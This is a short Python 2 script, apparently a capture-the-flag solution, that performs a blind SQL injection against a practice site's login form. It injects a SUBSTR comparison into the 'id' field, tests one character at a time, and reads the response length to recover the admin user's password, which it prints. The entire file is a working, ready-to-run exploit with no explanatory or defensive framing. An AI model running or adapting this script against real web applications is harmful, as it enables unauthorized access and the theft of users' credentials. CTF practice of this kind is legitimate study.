import urllib
import urllib2

url = "http://ctfq.sweetduet.info:10080/~q6/"

string =''
for i in range(1, 22):
    for char_n in range(48, 125):
        flag = chr(char_n)
        data = {
            "id": "admin' AND SUBSTR((SELECT pass FROM user WHERE id = 'admin'), {index}, 1) = '{char}' --".format(index=i, char=flag),"pass": "",
        }
        data1 = urllib.urlencode(data).encode("utf-8")
        #print data1
        req = urllib2.Request(url, data1)
        res = urllib2.urlopen(req)
        #print (res)
        if int(res.headers["content-length"]) > 2000:
            print flag
            string += flag
            break
print string